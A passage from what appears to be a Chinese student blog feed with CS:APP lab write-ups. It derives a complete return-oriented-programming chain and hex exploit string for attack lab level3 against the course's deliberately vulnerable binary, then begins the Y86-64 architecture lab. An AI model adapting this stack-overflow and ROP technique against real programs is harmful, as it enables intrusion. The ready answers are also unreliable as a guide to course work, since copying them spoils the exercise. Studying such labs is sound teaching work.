class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0000000000401994</span> &lt;start_farm&gt;:<br>  <span class="hljs-attribute">401994</span>:b8 <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x1,%eax<br>  <span class="hljs-attribute">401999</span>:c3                   retq   <br><br><span class="hljs-attribute">000000000040199a</span> &lt;getval_142&gt;:<br>  <span class="hljs-attribute">40199a</span>:b8 fb <span class="hljs-number">78</span> <span class="hljs-number">90</span> <span class="hljs-number">90</span>       mov    $<span class="hljs-number">0</span>x909078fb,%eax<br>  <span class="hljs-attribute">40199f</span>:c3                   retq   <br><br><span class="hljs-attribute">00000000004019a0</span> &lt;addval_273&gt;:<br>  <span class="hljs-attribute">4019a0</span>:<span class="hljs-number">8</span>d <span class="hljs-number">87</span> <span class="hljs-number">48</span> <span class="hljs-number">89</span> c7 c3    lea    -<span class="hljs-number">0</span>x3c3876b8(%rdi),%eax             #-&lt;&lt;gadget2  <span class="hljs-number">0</span>x4019a2<br>  <span class="hljs-attribute">4019a6</span>:c3                   retq   <br><br><span class="hljs-attribute">00000000004019a7</span> &lt;addval_219&gt;:<br>  <span class="hljs-attribute">4019a7</span>:<span class="hljs-number">8</span>d <span class="hljs-number">87</span> <span class="hljs-number">51</span> <span class="hljs-number">73</span> <span class="hljs-number">58</span> <span class="hljs-number">90</span>    lea    -<span class="hljs-number">0</span>x6fa78caf(%rdi),%eax                           #-&lt;&lt;gadget1  <span class="hljs-number">0</span>x4019ab<br>  <span class="hljs-attribute">4019ad</span>:c3                   retq   <br><br><span class="hljs-attribute">00000000004019ae</span> &lt;setval_237&gt;:<br>  <span class="hljs-attribute">4019ae</span>:c7 <span class="hljs-number">07</span> <span class="hljs-number">48</span> <span class="hljs-number">89</span> c7 c7    movl   $<span class="hljs-number">0</span>xc7c78948,(%rdi)<br>  <span class="hljs-attribute">4019b4</span>:c3                   retq   <br><br><span class="hljs-attribute">00000000004019b5</span> &lt;setval_424&gt;:<br>  <span class="hljs-attribute">4019b5</span>:c7 <span class="hljs-number">07</span> <span class="hljs-number">54</span> c2 <span class="hljs-number">58</span> <span class="hljs-number">92</span>    movl   $<span class="hljs-number">0</span>x9258c254,(%rdi)<br>  <span class="hljs-attribute">4019bb</span>:c3                   retq   <br><br><span class="hljs-attribute">00000000004019bc</span> &lt;setval_470&gt;:<br>  <span class="hljs-attribute">4019bc</span>:c7 <span class="hljs-number">07</span> <span class="hljs-number">63</span> <span class="hljs-number">48</span> <span class="hljs-number">8</span>d c7    movl   $<span class="hljs-number">0</span>xc78d4863,(%rdi)<br>  <span class="hljs-attribute">4019c2</span>:c3                   retq   <br><br><span class="hljs-attribute">00000000004019c3</span> &lt;setval_426&gt;:<br>  <span class="hljs-attribute">4019c3</span>:c7 <span class="hljs-number">07</span> <span class="hljs-number">48</span> <span class="hljs-number">89</span> c7 <span class="hljs-number">90</span>    movl   $<span class="hljs-number">0</span>x90c78948,(%rdi)                 #也可作为gadget2<br>  <span class="hljs-attribute">4019c9</span>:c3                   retq   <br><br><span class="hljs-attribute">00000000004019ca</span> &lt;getval_280&gt;:<br>  <span class="hljs-attribute">4019ca</span>:b8 <span class="hljs-number">29</span> <span class="hljs-number">58</span> <span class="hljs-number">90</span> c3       mov    $<span class="hljs-number">0</span>xc3905829,%eax<br>  <span class="hljs-attribute">4019cf</span>:c3                   retq   <br><br><span class="hljs-attribute">00000000004019d0</span> &lt;mid_farm&gt;:<br>  <span class="hljs-attribute">4019d0</span>:b8 <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x1,%eax<br>  <span class="hljs-attribute">4019d5</span>:c3                   retq <br></code></pre></td></tr></table></figure><h4 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h4><p>要求：用ROP实现part1的level3</p><p>提示：The official solution requires eight gadgets 。（指的是要用到下面这个函数，farm中的第八个）</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">00000000004019d6</span> &lt;add_xy&gt;:<br>  <span class="hljs-attribute">4019d6</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">04</span> <span class="hljs-number">37</span>          lea    (%rdi,%rsi,<span class="hljs-number">1</span>),%rax<br>  <span class="hljs-attribute">4019da</span>:c3                   retq   <br></code></pre></td></tr></table></figure><p>我们只能在栈中存储cookie，但不知道栈的位置，只能通过rsp寄存器读取。查表知道该指令只有48 89 e0到48 89 e7；在farm中可以搜到如下函数符合要求：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0000000000401a03</span> &lt;addval_190&gt;:<br>  <span class="hljs-attribute">401a03</span>:<span class="hljs-number">8</span>d <span class="hljs-number">87</span> <span class="hljs-number">41</span> <span class="hljs-number">48</span> <span class="hljs-number">89</span> e0    lea    -<span class="hljs-number">0</span>x1f76b7bf(%rdi),%eax<br>  <span class="hljs-attribute">401a09</span>:c3                   retq <br></code></pre></td></tr></table></figure><p><code>48 89 e0 c3   mov %rsp，%rax</code></p><p>而add_xy是%rdi和%rsi相加给%rax。</p><h5 id="错误答案"><a href="#错误答案" class="headerlink" title="错误答案"></a>错误答案</h5><p>执行完getbuf之后rsi的值为0x31&#x3D;49。</p><img src="./image/3,attack_lab(target)_image/image-20240510203203744.png" alt="image-20240510203203744" style="zoom: 67%;" /><p>因此，执行逻辑应该是</p><img src="./image/3,attack_lab(target)_image/image-20240510211646149.png" alt="image-20240510211646149" style="zoom: 67%;" /><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs llvm">mov <span class="hljs-variable">%rsp</span><span class="hljs-punctuation">,</span><span class="hljs-variable">%rax</span>       #gadget<span class="hljs-number">1</span>             #farm中地址 <span class="hljs-number">0x401a06</span><br><span class="hljs-keyword">ret</span> <br>mov <span class="hljs-variable">%rax</span><span class="hljs-punctuation">,</span><span class="hljs-variable">%rdi</span>        #gadget<span class="hljs-number">2</span>              <span class="hljs-variable">#0</span><span class="hljs-keyword">x</span><span class="hljs-number">4019</span><span class="hljs-keyword">c</span><span class="hljs-number">5</span><br><span class="hljs-keyword">ret</span><br>lea    (<span class="hljs-variable">%rdi</span><span class="hljs-punctuation">,</span><span class="hljs-variable">%rsi</span><span class="hljs-punctuation">,</span><span class="hljs-number">1</span>)<span class="hljs-punctuation">,</span><span class="hljs-variable">%rax</span>   #gadget<span class="hljs-number">3</span>        <span class="hljs-variable">#0</span><span class="hljs-keyword">x</span><span class="hljs-number">4019</span>d<span class="hljs-number">6</span><br><span class="hljs-keyword">ret</span><br>mov <span class="hljs-variable">%rax</span><span class="hljs-punctuation">,</span><span class="hljs-variable">%rdi</span>     #gadget<span class="hljs-number">4</span>                  <span class="hljs-variable">#0</span><span class="hljs-keyword">x</span><span class="hljs-number">4019</span><span class="hljs-keyword">c</span><span class="hljs-number">5</span><br><span class="hljs-keyword">ret</span> <br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">06</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>        /* gadget1 */<br><span class="hljs-attribute">c5</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>        /* gadget2 */<br><span class="hljs-attribute">d6</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>        /* gadget3 */<br><span class="hljs-attribute">c5</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>        /* gadget4 */<br><span class="hljs-attribute">fa</span> <span class="hljs-number">18</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>        /* touch3 */<br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span>                               /* 偏移<span class="hljs-number">0</span>x31=<span class="hljs-number">49</span> */ <br><span class="hljs-attribute">35</span> <span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span>        /* cookie */<br></code></pre></td></tr></table></figure><p>gdb调试时发现有如下错误：Program received signal SIGSEGV, Segmentation fault.</p><p>使用上述方法在执行到touch3时，sval指向是没问题的，进入hexmatch后，在执行sprintf函数时会报错。</p><p>猜测可能是因为：64位的CPU每个时刻周期可以读取8个字节，根据内存对齐，（字符串数组名是一个指针），指针指向的栈中地址应该是8的倍数？即上述偏移0x31不满足要求。网上的答案都是0x48作为偏移。</p><p>教材p189页：</p><p>&#x3D;&#x3D;许多计算机系统对基本数据类型的合法地址做了一些限制，要求某种类型对象所在的地址必须是某个值K的倍数，K的具体如下图所示。&#x3D;&#x3D;</p><table><thead><tr><th align="center">K</th><th align="center">类型</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">char</td></tr><tr><td align="center">2</td><td align="center">short</td></tr><tr><td align="center">4</td><td align="center">int, float</td></tr><tr><td align="center">8</td><td align="center">long,double,char*</td></tr></tbody></table><h5 id="正确答案"><a href="#正确答案" class="headerlink" title="正确答案"></a>正确答案</h5><p>&#x3D;&#x3D;构造一个偏移量    需要为8的倍数&#x3D;&#x3D;</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs llvm">mov <span class="hljs-variable">%rsp</span><span class="hljs-punctuation">,</span><span class="hljs-variable">%rax</span>   #gadget<span class="hljs-number">1</span>   <span class="hljs-number">48</span> <span class="hljs-number">89</span> e<span class="hljs-number">0</span> <span class="hljs-keyword">c</span><span class="hljs-number">3</span>          #farm中地址 <span class="hljs-number">0x401a06</span> <span class="hljs-number">401</span>aad （多个<br><span class="hljs-keyword">ret</span><br>mov <span class="hljs-variable">%rax</span><span class="hljs-punctuation">,</span><span class="hljs-variable">%rdi</span>       #gadget<span class="hljs-number">2</span>  <span class="hljs-number">48</span> <span class="hljs-number">89</span> <span class="hljs-keyword">c</span><span class="hljs-number">7</span> <span class="hljs-number">90</span> <span class="hljs-keyword">c</span><span class="hljs-number">3</span>            <span class="hljs-variable">#0</span><span class="hljs-keyword">x</span><span class="hljs-number">4019</span><span class="hljs-keyword">c</span><span class="hljs-number">5</span> <span class="hljs-number">0x4019a2</span> 不唯一<br><span class="hljs-keyword">ret</span> <br><br>/* -------------------构造偏移量 放入rsi中-------------------- */<br>popq <span class="hljs-variable">%rax</span>             # gadget<span class="hljs-number">3</span>  <span class="hljs-number">58</span> <span class="hljs-number">90</span> <span class="hljs-keyword">c</span><span class="hljs-number">3</span>  #只查到了pop rax 且不唯一  <span class="hljs-variable">#0</span><span class="hljs-keyword">x</span><span class="hljs-number">4019</span>ab <span class="hljs-number">0x4019cc</span>        (<span class="hljs-number">1</span>)<br><span class="hljs-keyword">ret</span><br>movl  <span class="hljs-variable">%eax</span><span class="hljs-punctuation">,</span><span class="hljs-variable">%edx</span>           #没有<span class="hljs-number">48</span> <span class="hljs-number">89</span> cx movq <span class="hljs-variable">%rax</span><span class="hljs-punctuation">,</span><span class="hljs-variable">%xxx</span>(非rdi)  考虑movl <span class="hljs-variable">%eax</span><span class="hljs-punctuation">,</span><span class="hljs-variable">%xxx</span>(非edi)  <span class="hljs-number">89</span> cx   有一个<span class="hljs-number">89</span> <span class="hljs-keyword">c</span><span class="hljs-number">2</span> <span class="hljs-number">90</span> <span class="hljs-keyword">c</span><span class="hljs-number">3</span> #在<span class="hljs-number">0x4019dd</span>  (<span class="hljs-number">2</span>)<br><span class="hljs-keyword">ret</span><br>mov <span class="hljs-variable">%edx</span><span class="hljs-punctuation">,</span><span class="hljs-variable">%ecx</span>          <span class="hljs-variable">#89</span> d<span class="hljs-number">1</span>  <span class="hljs-number">08</span> db <span class="hljs-keyword">c</span><span class="hljs-number">3</span>    在<span class="hljs-variable">#0</span><span class="hljs-keyword">x</span><span class="hljs-number">401</span>a<span class="hljs-number">69</span>   其中<span class="hljs-number">08</span> db不改变寄存器   或者<span class="hljs-number">0x401a70</span> <span class="hljs-number">401</span>a<span class="hljs-number">34</span>  (<span class="hljs-number">4</span>)<br><span class="hljs-keyword">ret</span><br>movl <span class="hljs-variable">%ecx</span><span class="hljs-punctuation">,</span><span class="hljs-variable">%esi</span>       <span class="hljs-variable">#89</span> <span class="hljs-keyword">c</span><span class="hljs-number">6</span>/ce-f<span class="hljs-number">6</span>/fe  有一个<span class="hljs-number">89</span> ce <span class="hljs-number">90</span> <span class="hljs-number">90</span> <span class="hljs-keyword">c</span><span class="hljs-number">3</span>  在<span class="hljs-number">0x401a13</span>    (<span class="hljs-number">3</span>)<br><span class="hljs-keyword">ret</span> <br>/* -----------------------构造完毕------------------------------- */<br>lea    (<span class="hljs-variable">%rdi</span><span class="hljs-punctuation">,</span><span class="hljs-variable">%rsi</span><span class="hljs-punctuation">,</span><span class="hljs-number">1</span>)<span class="hljs-punctuation">,</span><span class="hljs-variable">%rax</span>   #gadget<span class="hljs-number">7</span>        <span class="hljs-variable">#0</span><span class="hljs-keyword">x</span><span class="hljs-number">4019</span>d<span class="hljs-number">6</span><br><span class="hljs-keyword">ret</span><br>mov <span class="hljs-variable">%rax</span><span class="hljs-punctuation">,</span><span class="hljs-variable">%rdi</span>     #gadget<span class="hljs-number">8</span>                 <span class="hljs-variable">#0</span><span class="hljs-keyword">x</span><span class="hljs-number">4019</span><span class="hljs-keyword">c</span><span class="hljs-number">5</span><br><span class="hljs-keyword">ret</span> <br></code></pre></td></tr></table></figure><p>该问题解决时 先查找（1），即符合条件的pop，</p><p>然后查找（2），看rax能赋给何处，</p><p>然后查找（4），看谁可以赋给rsi，</p><p>然后查找（3），找到衔接 </p><p><img src="/project/./image/3,attack_lab(target)_image/image-20240511132105962.png" alt="image-20240511132105962"></p><p>答案为</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">ad</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>        /* gadget1地址 多个 */<br><span class="hljs-attribute">c5</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>        /* gadget2地址 多个 */<br><span class="hljs-attribute">ab</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>      /* gadget3地址 */<br><span class="hljs-attribute">48</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>      /* gadget3要 pop的偏移量 */<br><span class="hljs-attribute">dd</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">70</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>      /* <span class="hljs-number">5</span> */<br><span class="hljs-attribute">13</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>     <br><span class="hljs-attribute">d6</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>        /* gadget7 */<br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>        /* gadget8 */<br><span class="hljs-attribute">fa</span> <span class="hljs-number">18</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>        /* touch3 */<br><span class="hljs-attribute">35</span> <span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span>        /*   偏移<span class="hljs-number">0</span>x48=<span class="hljs-number">72</span> cookie */<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;注意 答案格式中 &#x2F;* comment *&#x2F;必须之间有俩空格隔开&#x3D;&#x3D;</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该实验主要学习了CI（代码注入）和ROP（返回引导编程）这两种攻击手段。</p><p>其共同特点是利用栈溢出进行攻击。攻击是让程序不按照原逻辑进行执行，通过修改参数和跳转方向，改变执行结果。</p><p>CI是通过栈溢出修改返回地址，使返回地址指向攻击代码，由于攻击代码写在了栈区，因此需要知道攻击代码在栈区的地址，这就使得该攻击手段可以被栈随机化抵御。</p><p>而ROP则是利用所谓gadget，gadget是程序代码中以ret结尾的代码段，ret之前是诸如mov，pop等汇编语句，通过栈区溢出引导程序跳转到gadget，以实现攻击。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/project/2025/05/24/csapp/4,arch_lab/"/>
    <url>/project/2025/05/24/csapp/4,arch_lab/</url>
    
    <content type="html"><![CDATA[<h2 id="PartA"><a href="#PartA" class="headerlink" title="PartA"></a>PartA</h2><p>用Y86-64的汇编指令，实现三个函数</p><p>working in directory sim&#x2F;misc</p><p>链表list简单求和</p><p>链表递归求和</p><p>数组复制</p><p>该汇编和x86-64的功能相似，但更简单，其传递参数、存储局部变量、调用函数、栈帧也类似</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * Architecture Lab: Part A </span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * High level specs for the functions that the students will rewrite</span><br><span class="hljs-comment"> * in Y86-64 assembly language</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">/* $begin examples */</span><br><span class="hljs-comment">/* linked list element */</span><br>typedef struct ELE &#123;<br>    <span class="hljs-type">long</span> val;<br>    struct ELE *next;<br>&#125; *list_ptr;<br><br><span class="hljs-comment">/* sum_list - Sum the elements of a linked list */</span><br><span class="hljs-type">long</span> <span class="hljs-title function_">sum_list</span><span class="hljs-params">(list_ptr ls)</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (ls) &#123;<br>val += ls-&gt;val;<br>ls = ls-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> val;<br>&#125;<br><br><span class="hljs-comment">/* rsum_list - Recursive version of sum_list */</span><br><span class="hljs-type">long</span> <span class="hljs-title function_">rsum_list</span><span class="hljs-params">(list_ptr ls)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!ls)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">long</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> ls-&gt;val;<br><span class="hljs-type">long</span> <span class="hljs-variable">rest</span> <span class="hljs-operator">=</span> rsum_list(ls-&gt;next);<br><span class="hljs-keyword">return</span> val + rest;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/* copy_block - Copy src to dest and return xor checksum of src */</span><br><span class="hljs-type">long</span> <span class="hljs-title function_">copy_block</span><span class="hljs-params">(<span class="hljs-type">long</span> *src, <span class="hljs-type">long</span> *dest, <span class="hljs-type">long</span> len)</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (len &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-type">long</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> *src++;<br>*dest++ = val;<br>result ^= val;<br>len--;<br>    &#125;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br><span class="hljs-comment">/* $end examples */</span><br><br></code></pre></td></tr></table></figure><h4 id="sum-list"><a href="#sum-list" class="headerlink" title="sum_list"></a>sum_list</h4><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># Sample linked list</span><br>    .pos <span class="hljs-number">0</span><br>    irmovq stack,<span class="hljs-variable">%rsp</span><br>    call main<br>    halt<br><br>    .align <span class="hljs-number">8</span><br>ele1:<br>    .quad <span class="hljs-number">0x00a</span><br>    .quad ele2<br>ele2:<br>    .quad <span class="hljs-number">0x0b0</span><br>    .quad ele3<br>ele3:<br>    .quad <span class="hljs-number">0xc00</span><br>    .quad <span class="hljs-number">0</span><br><br>main:<br>    irmovq ele1,<span class="hljs-variable">%rdi</span><br>    call sum_list<br>    ret<br><br>sum_list:<br>    irmovq <span class="hljs-variable">$0</span>,<span class="hljs-variable">%rax</span><br>    irmovq <span class="hljs-variable">$8</span>,<span class="hljs-variable">%r8</span><br>    andq <span class="hljs-variable">%rdi</span>,<span class="hljs-variable">%rdi</span><br>    jmp test<br><br>loop:<br>    mrmov<span class="hljs-string">q (<span class="hljs-variable">%rdi</span>)</span>,<span class="hljs-variable">%r10</span><br>    addq <span class="hljs-variable">%r10</span>,<span class="hljs-variable">%rax</span><br>    addq <span class="hljs-variable">%r8</span>,<span class="hljs-variable">%rdi</span><br>    mrmov<span class="hljs-string">q (<span class="hljs-variable">%rdi</span>)</span>,<span class="hljs-variable">%r10</span><br>    rrmovq <span class="hljs-variable">%r10</span>,<span class="hljs-variable">%rdi</span><br>    andq <span class="hljs-variable">%rdi</span>,<span class="hljs-variable">%rdi</span><br>    jmp test<br><br>test:<br>    jne loop<br>    ret<br><br>    .pos <span class="hljs-number">0x200</span><br>stack:<br></code></pre></td></tr></table></figure><p>验证：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 